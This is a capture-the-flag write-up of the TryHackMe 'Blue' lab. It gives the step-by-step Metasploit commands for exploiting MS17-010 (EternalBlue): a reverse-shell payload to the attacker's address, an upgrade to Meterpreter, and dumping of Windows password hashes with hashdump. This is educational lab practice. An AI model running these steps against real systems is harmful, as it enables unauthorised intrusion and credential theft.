# 🔵 TryHackMe: Blue

**Difficulty:** Easy  
**Category:** Windows Exploitation, SMB, Metasploit, Post-Exploitation

## 📌 Room Overview

The Blue room focuses on exploiting a Windows machine vulnerable to **MS17-010 (EternalBlue)**, a vulnerability in the SMB protocol.

The objective was to identify the vulnerable service, gain initial access using Metasploit, upgrade the shell to a Meterpreter session, and understand Windows credential hash dumping.

## 🛠️ Tools Used

- Kali Linux
- Nmap
- Metasploit Framework
- Meterpreter
- OpenVPN

## 🔍 1. VPN Connection & Target Discovery

Connected my Kali Linux VM to the TryHackMe network using OpenVPN.

```bash
sudo su
ip a
cd Downloads
sudo openvpn <my-config-file>.ovpn
```

Verified connectivity to the target:

```bash
ping <TARGET-IP>
```

## 🔍 2. Network Scanning & Enumeration

Performed service and vulnerability scanning using Nmap:

```bash
nmap <TARGET-IP> -sV -Pn -T4 -vv --script vuln
```

**Observation:** Identified the Windows SMB service and the MS17-010 vulnerability.

## 💥 3. Exploitation Using Metasploit

Started the Metasploit Framework:

```bash
msfconsole -q
```

Searched for the MS17-010 exploit:

```bash
search ms17-010
use 0
```

Configured the required options:

```bash
show options
set rhosts <TARGET-IP>
set lhost <MY-VPN-IP>
set payload windows/x64/shell/reverse_tcp
run
```

**Learning:** The exploit was used to obtain an initial reverse shell.

*Note: The first attempt encountered a timeout. Troubleshooting included changing the listening port and retrying the lab.*

## 🖥️ 4. Shell to Meterpreter Upgrade

The initial reverse shell provided basic command execution.

To obtain a more capable session, I used the shell-to-Meterpreter post-exploitation module.

Backgrounded the current shell:

```text
Ctrl + Z
y
```

Checked available sessions:

```bash
sessions
```

Searched for the upgrade module:

```bash
search shell_to_meterpreter
```

Selected and configured the module:

```bash
use post/multi/manage/shell_to_meterpreter
show options
set session 1
run
```

Interacted with the new session:

```bash
sessions
sessions -i 2
```

**Learning:** A raw shell and Meterpreter session provide different levels of functionality. Meterpreter provides additional post-exploitation capabilities.

## 🔐 5. Windows Post-Exploitation

Executed basic Meterpreter commands:

```bash
ls
pwd
whoami
help
```

Used the hash-dumping command:

```bash
hashdump
```

**Learning:** Understood the concept of Windows credential hash dumping and the role of the SAM database and NTLM hashes.

The retrieved hashes were conceptually cross-referenced with CrackStation to understand hash identification and cracking workflows.

## 📂 6. Locating Lab Files

Searched for flag files:

```bash
search -f flag*.txt
```

Navigated to the relevant directories and inspected the files.

```bash
pwd
ls
cat flag1.txt
```

Actual flag values are intentionally not included in this writeup.

 ## 🧠 Key Concepts Learned

| Concept | Definition |
|---|---|
| **MS17-010 (EternalBlue)** | A Windows SMB vulnerability that can allow remote code execution on vulnerable systems. |
| **SMB (Server Message Block)** | A network protocol used for sharing files, printers, and other resources. |
| **RCE (Remote Code Execution)** | When an attacker is able to execute arbitrary code or commands on a remote system. |
| **Reverse Shell** | A connection initiated by the target machine back to the attacker's machine, providing command-line access. |
| **Meterpreter** | An advanced Metasploit payload that provides additional post-exploitation capabilities. |
| **Hashing** | A one-way function that converts data of any length into a fixed-size output, used to maintain data integrity. |
| **GTFOBins** | A curated database of Unix binaries that can be exploited to bypass local security restrictions and escalate privileges. |
| **SAM (Security Account Manager)** | Windows database storing hashed user credentials, located at `C:\Windows\System32\config\SAM`. |
| **NTLM** | Windows authentication protocol (New Technology LAN Manager); NTLMv2 is the current, more secure version, succeeding the older and insecure LM (LAN Manager). |
| **Hash Dumping** | The process of extracting stored password hashes from a system for security analysis. |

## 🔄 Payload vs Meterpreter Upgrade

Two different components were used during the exploitation process:

| Component | Purpose |
|---|---|
| `windows/x64/shell/reverse_tcp` | Initial reverse shell payload. |
| `post/multi/manage/shell_to_meterpreter` | Upgrades an existing shell into a Meterpreter session. |

**Important:** The second component is a post-exploitation module, not an initial exploit payload.

## 🎯 Key Takeaways

- Learned to identify vulnerable SMB services using Nmap.
- Understood the MS17-010 vulnerability.
- Practised Metasploit module configuration.
- Understood the difference between a raw shell and Meterpreter.
- Learned about Windows SAM and NTLM hashes.
- Practised basic post-exploitation navigation.

---

**Lab Environment:** Kali Linux VM + VMware + OpenVPN  
**Purpose:** Educational cybersecurity lab practice.
